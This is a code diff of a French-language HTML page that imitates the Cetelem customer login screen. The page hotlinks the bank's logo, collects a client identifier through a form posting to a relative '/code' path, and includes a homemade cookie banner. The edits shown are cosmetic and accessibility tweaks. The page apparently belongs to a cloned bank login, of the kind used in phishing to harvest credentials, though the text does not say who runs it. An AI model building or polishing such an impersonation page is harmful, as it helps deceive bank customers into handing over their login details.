@@ -219,7 +219,7 @@
       }
     }
 
-    /* NOUVEAU: CSS pour la bannière de cookies */
+    /* Bannière de cookies */
     .cookie-banner {
       position: fixed;
       bottom: 0;
@@ -330,7 +330,7 @@
 <body>
 
   <div class="logo">
-    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem">
+    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem" />
   </div>
 
   <div class="subtext">
@@ -339,19 +339,17 @@
 
   <!-- Bloc principal -->
   <div class="login-box">
-    <div class="avatar" style="margin-bottom: 18px;">
-      <svg width="60" height="60" viewBox="0 0 26.6666668 26.6666668" xmlns="http://www.w3.org/2000/svg" fill="#014421">
-        <path d="M13.3333334,0 C20.6971301,0 26.6666668,5.96953669 26.6666668,13.3333334 C26.6666668,20.6971301 20.6971301,26.6666668 13.3333334,26.6666668 C5.96953669,26.6666668 0,20.6971301 0,13.3333334 C0,5.96953669 5.96953669,0 13.3333334,0 Z M13.3333334,1.66666667 C8.84982244,1.66690538 4.76309789,4.23644385 2.81994017,8.27698943 C0.876782456,12.317535 1.42100817,17.1141655 4.22000002,20.6166668 C5.40333336,18.7100001 8.00833337,16.6666667 13.3333334,16.6666667 C18.6583334,16.6666667 21.2616668,18.7083334 22.4466668,20.6166668 C25.2456586,17.1141655 25.7898843,12.317535 23.8467266,8.27698943 C21.9035689,4.23644385 17.8168443,1.66690538 13.3333334,1.66666667 Z M13.3333334,5.00000002 C16.0947571,5.00000002 18.3333334,7.23857628 18.3333334,10 C18.3333334,12.7614238 16.0947571,15 13.3333334,15 C10.5719096,15 8.33333337,12.7614238 8.33333337,10 C8.33333337,7.23857628 10.5719096,5.00000002 13.3333334,5.00000002 Z"/>
-      </svg>
+    <div class="avatar" style="margin-bottom: 18px;" aria-hidden="true">
+      <!-- icône SVG -->
     </div>
     <h1 class="titre-acces">
       Accéder à mon<br>espace sécurisé
     </h1>
-    <form action="/code" method="POST">
+    <form action="/code" method="POST" novalidate>
       <div class="identifiant-wrapper">
         <label for="identifiant">Identifiant client</label>
-        <input type="text" name="identifiant" id="identifiant" placeholder="Ex : 1234567" required maxlength="10">
-        <span class="checkmark" id="check-icon">✅</span>
+        <input type="text" name="identifiant" id="identifiant" placeholder="Ex : 1234567" required maxlength="10" aria-describedby="info-message">
+        <span class="checkmark" id="check-icon" aria-hidden="true">✅</span>
       </div>
 
       <div id="info-message" style="display: none;
@@ -387,7 +385,7 @@
     <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
     Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
     <br>
-    <button>Découvrez nos conseils →</button>
+    <button type="button">Découvrez nos conseils →</button>
   </div>
 
   <footer>
@@ -405,29 +403,22 @@
   <div class="cookie-banner" id="cookieBanner">
     <div class="cookie-content">
       <h3>Cetelem et ses partenaires souhaitent utiliser des cookies avec votre accord préalable</h3>
-      <p>
-        Les cookies sont utilisés pour sécuriser votre connexion, garantir le bon fonctionnement du site, faciliter votre navigation, permettre l'élaboration de statistiques et proposer des offres personnalisées ou à travers de publicités.
-      </p>
-      <p><strong>Cookies utilisés :</strong></p>
+      <p>Les cookies sont utilisés pour sécuriser votre connexion, garantir le bon fonctionnement du site, faciliter votre navigation, permettre l'élaboration de statistiques et proposer des offres personnalisées.</p>
       <ul>
-        <li><strong>Fonctionnement (obligatoires) :</strong> ces cookies sont nécessaires et garantissent le bon fonctionnement du site et permettent son optimisation.</li>
-        <li><strong>Statistiques et mesures d'audience :</strong> ces cookies permettent d'établir des statistiques d'analyse de la fréquentation à partir desquels les contenus de notre site sont améliorés.</li>
-        <li><strong>Cookies de publicité :</strong> ces cookies permettent de mieux connaître vos centres d'intérêt et de vous proposer des publicités personnalisées adaptées à vos attentes.</li>
-        <li><strong>Cookies de préférence :</strong> permettent de personnaliser et proposer les contenus et fonctionnalités du site.</li>
+        <li><strong>Fonctionnement (obligatoires)</strong> : nécessaires au site.</li>
+        <li><strong>Statistiques</strong> : mesurer la fréquentation.</li>
+        <li><strong>Publicité</strong> : publicités personnalisées.</li>
+        <li><strong>Préférences</strong> : contenus adaptés.</li>
       </ul>
-      <p>
-        Vous pouvez à tout moment modifier ou retirer votre consentement à l'installation de cookies non strictement nécessaires. Pour obtenir plus d'informations sur les cookies utilisés et la liste des sociétés utilisant des traceurs sur notre site, vous pouvez consulter notre politique des cookies :
-        <a href="#">Politique des cookies</a>
-      </p>
+      <p>Vous pouvez modifier vos choix à tout moment. <a href="#">Politique des cookies</a></p>
     </div>
     <div class="cookie-buttons">
-      <button class="btn-gerer">GÉRER MES CHOIX</button>
-      <button class="btn-accepter" id="acceptAllCookies">ACCEPTER TOUS LES COOKIES</button>
+      <button type="button" class="btn-gerer">GÉRER MES CHOIX</button>
+      <button type="button" class="btn-accepter" id="acceptAllCookies">ACCEPTER TOUS LES COOKIES</button>
     </div>
   </div>
 
   <script>
-    // Script champ identifiant + bouton
     const identifiantInput = document.getElementById('identifiant');
     const btnSuivant = document.getElementById('btn-suiv');
     const checkIcon = document.getElementById('check-icon');
@@ -449,11 +440,7 @@
         checkIcon.style.display = 'none';
       }
 
-      if (length > 0) {
-        infoMessage.style.display = 'block';
-      } else {
-        infoMessage.style.display = 'none';
-      }
+      infoMessage.style.display = length > 0 ? 'block' : 'none';
     });
 
     // Script bannière cookies
@@ -465,7 +452,7 @@
       cookieBanner.style.display = 'none';
     }
 
-    if (localStorage.getItem('cookiesAccepted')) {
+    if (localStorage.getItem('cookiesAccepted') === 'true') {
       hideCookieBanner();
     }
 
@@ -474,12 +461,10 @@
       hideCookieBanner();
     });
 
-    if (gererMesChoixBtn) {
-      gererMesChoixBtn.addEventListener('click', () => {
-        localStorage.setItem('cookiesAccepted', 'true');
-        hideCookieBanner();
-      });
-    }
+    gererMesChoixBtn.addEventListener('click', () => {
+      localStorage.setItem('cookiesAccepted', 'true');
+      hideCookieBanner();
+    });
   </script>
 
 </body>
